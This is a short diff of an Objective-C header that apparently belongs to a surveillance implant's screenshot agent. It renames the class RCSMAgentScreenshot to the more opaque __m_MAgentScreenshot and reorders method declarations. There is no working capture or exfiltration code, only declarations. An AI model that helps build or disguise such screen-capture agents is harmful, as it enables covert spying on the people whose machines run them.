@@ -32,23 +32,24 @@ typedef struct _screenshotHeader {
 } screenshotAdditionalStruct;
 
 
-@interface RCSMAgentScreenshot : NSObject <Agents>
+@interface __m_MAgentScreenshot : NSObject <Agents>
 {
 @private
   NSMutableDictionary *mAgentConfiguration;
   uint32_t mSleepSec;
 }
 
-+ (RCSMAgentScreenshot *)sharedInstance;
++ (__m_MAgentScreenshot *)sharedInstance;
 + (id)allocWithZone: (NSZone *)aZone;
 - (id)copyWithZone: (NSZone *)aZone;
-- (id)retain;
-- (unsigned)retainCount;
 - (void)release;
 - (id)autorelease;
+- (id)retain;
+- (unsigned)retainCount;
 
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
 - (NSMutableDictionary *)mAgentConfiguration;
+- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
+
 
 @end
 
